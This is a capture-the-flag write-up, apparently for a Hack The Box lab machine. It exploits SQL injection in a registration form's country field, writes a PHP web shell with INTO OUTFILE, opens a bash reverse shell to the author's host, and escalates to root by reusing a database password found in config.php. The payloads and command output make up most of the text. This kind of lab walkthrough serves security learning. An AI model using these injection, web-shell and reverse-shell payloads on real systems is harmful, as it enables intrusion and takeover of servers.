![image](https://user-images.githubusercontent.com/105310322/193155470-12db0028-07ed-47e0-ae63-5ffcbfab9cf6.png)


### Tools: Burpsuite

### Vulnerabilities: SQLI: Union Select OutFile, Password Reuse

```console
└─$ nmap -A -p- -T4 -Pn 10.129.95.235
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 14:11 CDT
Nmap scan report for 10.129.95.235
Host is up (0.060s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http           Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open     http           nginx
|_http-title: 403 Forbidden
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http           nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.13 seconds
```

Port 80 brings us to a webpage with a single input for a username, but all it does is register usernames. However every different username you pick will be given a hashed cookie. This is important for later.

![image](https://user-images.githubusercontent.com/105310322/193152387-708a3710-a7d5-49b3-a9f7-965c22da07a8.png)

Since there wasnt anything else to discover I opened burp suite and found something interesting. The country field can be edited in burp but not on the webpage. This country field turned out to be vulnerable to SQLI(After trying lots of things)

```
POST / HTTP/1.1
Host: 10.129.95.235
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://10.129.95.235
DNT: 1
Connection: close
Referer: http://10.129.95.235/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=asd&country=Brazil
```
We can confrim that it is vulnerable simply by putting a ' after the country name.

```Argentina'```

Doing so gives us an error 

Note: You will need a new cookie everytime you send a new command with the country. This is because it will keep loading your old cookies info.

```php
:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
Stack trace:
#0 {main}
```
Adding -- - will not give us an error ```Argentina'-- -``` So lets test out Union Select :)

Note: The following process for burpsuite will be as follows.

![image](https://user-images.githubusercontent.com/105310322/193153575-ff6301b9-7150-4305-8bcc-adb5cd3660bb.png)


1. Input your command after the country ```Argentina' union select null-- -```
2. Change your username Ex. keep adding letters for every new name, this will give a new cookie.
3. Click send
4. Copy the cookie in the RESPONSE panel of burp
5. Paste over your REQUEST cookie in burp
6. Click send
7. Click follow redirect
8. You should get some output or an error

So Next I followed hacktricks for some easy union select commands

https://book.hacktricks.xyz/pentesting-web/sql-injection

Doing so I was able to leak the databases.


```Argentina' UniOn Select gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata-- -```

```php
<div class="container">
		<h1 class="text-center m-5">Join the UHC - September Qualifiers</h1>
		
	</div>
	<section class="bg-dark text-center p-5 mt-4">
		<div class="container p-5">
            <h1 class="text-white">Welcome asdfqaaaaababaaaaa</h1><h3 class="text-white">Other Players In Argentina'UNION SELECT gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata-- -</h3><li class='text-white'>asdf</li><li class='text-white'>|information_schema|,|performance_schema|,|mysql|,|registration|</li>		</div>
```

Then I leaked the tables.


```Argentina' UniOn Select gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables-- -```

```
|ALL_PLUGINS|,|APPLICABLE_ROLES|,|CHARACTER_SETS|,|CHECK_CONSTRAINTS|,|COLLATIONS|,|COLLATION_CHARACTER_SET_APPLICABILITY|,|COLUMNS|,|COLUMN_PRIVILEGES|,|ENABLED_ROLES|,|ENGINES|,|EVENTS|,|FILES|,|GLOBAL_STATUS|,|GLOBAL_VARIABLES|,|KEY_CACHES|,|KEY_COLUMN_USAGE|,|OPTIMIZER_TRACE|,|PARAMETERS|,|PARTITIONS|,|PLUGINS|,|PROCESSLIST|,|PROFILING|,|REFERENTIAL_CONSTRAINTS|,|ROUTINES|,|SCHEMATA|,|SCHEMA_PRIVILEGES|,|SESSION_STATUS|,|SESSION_VARIABLES|,|STATISTICS|,|SYSTEM_VARIABLES|,|TABLES|,|TABLESPACES|,|TABLE_CONSTRAINTS|,|TABLE_PRIVILEGES|,|TRIGGERS|,|USER_PRIVILEGES|,|VIEWS|,|CLIENT_STATISTICS|,|INDEX_STATISTICS|,|INNODB_SYS_DATAFILES|,|GEOMETRY_COLUMNS|,|INNODB_SYS_TABLESTATS|,|SPATIAL_REF_SYS|,|INNODB_BUFFER_PAGE|,|INNODB_TRX|,|INNODB_CMP_PER_INDEX|,|INNODB_METRICS|,|INNODB_LOCK_WAITS|,|INNODB_CMP|,|THREAD_POOL_WAITS|,|INNODB_CMP_RESET|,|THREAD_POOL_QUEUES|,|TABLE_STATISTICS|,|INNODB_SYS_FIELDS|,|INNODB_BUFFER_PAGE_LRU|,|INNODB_LOCKS|,|INNODB_FT_INDEX_TABLE|,|INNODB_CMPMEM|,|THREAD_POOL_GROUPS|,|INNODB_CMP_PER_INDEX_RESET|,|INNODB_SYS_FOREIGN_COLS|,|INNODB_FT_INDEX_CACHE|,|INNODB_BUFFER_POOL_STATS|,|INNODB_FT_BEING_DELETED|,|INNODB_SYS_FOREIGN|,|INNODB_CMPMEM_RESET|,|INNODB_FT_DEFAULT_STOPWORD|,|INNODB_SYS_TABLES|,|INNODB_SYS_COLUMNS|,|INNODB_FT_CONFIG|,|USER_STATISTICS|,|INNODB_SYS_TABLESPACES|,|INNODB_SYS_VIRTUAL|,|INNODB_SYS_INDEXES|,|INNODB_SYS_SEMAPHORE_WAITS|,|INNODB_MUTEXES|,|user_variables|,|INNODB_TABLESPACES_ENCRYPTION|,|INNODB_FT_DELETED|,|THREAD_POOL_STATS|,|accounts|,|cond_instances|,|events_stages_current|,|events_stages_history|,|events_stages_history_long|,|events_stages_summary_by_account_by_event_name|,|events_stages_summary_by_host_by_event_name|,|events_stages_summary_by_thread_by_event_name|,|events_stages_summary_by_user_by_event_name|,|events_stages_summary_global_by_event_name|,|events_statements_current|,|events_statements_history|,|events_statements_history_long|,|events_statements_summary_by_account_by_event_name|,|events_statements_summary_by_digest|,|events_statements_summary_by_host_by_event_name|,|events_statements_summary_by_program|,|events_statements_summary_by_thread_by_event_name|,|events_statements_summary_by_user_by_event_name|,|events_statements_summary_global_by_event_name|,|events_transactions_current|,|events_transactions_history|,|events_transactions_history_long|,|events_transactions_summary_by_account_by_event_name|,|events_transactions_summary_by_host_by_event_name|,|events_transactions_summary_by_thread_by_event_name|,|events_transactions_summary_by_user_by_event_name|,|events_transactions_summary_global_by_event_name|,|events_waits_current|,|events_waits_history|,|events_waits_history_long|,|events_waits_summary_by_account_by_event_name|,|events_waits_summary_by_host_by_event_name|,|events_waits_summary_by_instance|,|events_waits_summary_by_thread_by_event_name|,|events_waits_summary_by_user_by_event_name|,|events_waits_summary_global_by_event_name|,|file_instances|,|file_summary_by_event_name|,|file_summary_by_instance|,|global_status|,|host_cache|,|hosts|,|memory_summary_by_account_by_event_name|,|memory_summary_by_host_by_event_name|,|memory_summary_by_thread_by_event_name|,|memory_summary_by_user_by_event_name|,|memory_summary_global_by_event_name|,|metadata_locks|,|mutex_instances|,|objects_summary_global_by_type|,|performance_timers|,|prepared_statements_instances|,|replication_applier_configuration|,|replication_applier_status|,|replication_applier_status_by_coordinator|,|replication_connection_configuration|,|rwlock_instances|,|session_account_connect_attrs|,|session_connect_attrs|,|session_status|,|setup_actors|,|setup_consumers|,|setup_instruments|,|setup_objects|,|setup_timers|,|socket_instances|,|socket_summary_by_event_name|,|socket_summary_by_instance|,|status_by_account|,|status_by_host|,|status_by_thread|,|status_by_user|,|table_handles|,|table_io_waits_summary_by_index_usage|,|table_io_waits_summary_by_table|,|table_lock_waits_summary_by_table|,|threads|,|user_variables_by_thread|,|users|,|user|,|transaction_registry|,|help_relation|,|roles_mapping|,|help_keyword|,|global_priv|,|event|,|func|,|db|,|time_zone|,|procs_priv|,|tables_priv|,|help_topic|,|time_zone_leap_second|,|innodb_index_stats|,|table_stats|,|plugin|,|proxies_priv|,|general_log|,|gtid_slave_pos|,|time_zone_transition|,|time_zone_name|,|time_zone_transition_type|,|proc|,|slow_log|,|innodb_table_stats|,|column_stats|,|help_category|,|columns_priv|,|index_stats|,|servers|,|registration|
```

Finally I leaked the columns(there was too much info so i only grabbed the interesting ones. Unfortuneately there was not anything special hiding and these columns were for the registration table and listed every username and their hashed cookie :(

```Argentina' UniOn Select gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns-- -```

```username|,|userhash```

So I was at a loss of where to go next but I learned that you can actually load files with SQLI!

So lets test that!

First I typed out my payload and sent it. We can confirm the file is uploaded by going to the webpage http://10.129.95.235/base.txt and it worked!

```Argentina' UniOn Select 'All your base belong to us!' into outfile '/var/www/html/base.txt'-- -```

A reverse shell was not a straight forward as I first thought so I vreated a webshell instead.

Note: Be sure to URL encode it as there are alot of special characters. However I was having issues we certain URL encoding but this site worked for me

https://www.urlencoder.org/

I encoded this command ```"<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';-- -```

Then placed it at the end of my union select.

```Argentina' union select %22%3C%3Fphp%20SYSTEM(%24_REQUEST%5B%27cmd%27%5D)%3B%20%3F%3E%22%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27%3B--%20-```

After uploading and navigating to the page ```http://10.129.95.235/shell.php?cmd=``` I could input my commands and even cat the flag.

The more important thing was to get a reverse shell. So by running a simple bash reverse shell we can get it.

Remember to URL encode and set up your listener :)

```bash -c 'bash -i >& /dev/tcp/10.10.16.19/1234 0>&1'```

```http://10.129.95.235/shell.php?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E16%2E19%2F1234%200%3E%261%27```

Boom we are in! At this point I was actually in a hurry and was hoping for some ssh keys or some sort of persistence.

```console
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.19] from (UNKNOWN) [10.129.95.235] 48078
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ 
```
I ended up finding a password for my user but it did not work for ssh.

```console
www-data@validation:/var/www/html$ cat config.php
cat config.php
```
```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```
```console
www-data@validation:/home/htb$ cat user.txt
cat user.txt
98ee980209494114bb05cad012282eda
```
However when I tried the root user it was an instant success!

```console
www-data@validation:/home/htb$ su root
su root
Password: uhc-9qual-global-pw
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
8e07f8181fa75bebe59c416e44296aca
```
Luckily in the end I did not need to rush and I got root very quickly.

Remember always try sudo -l and su root and keep it simple stupid.

GG!
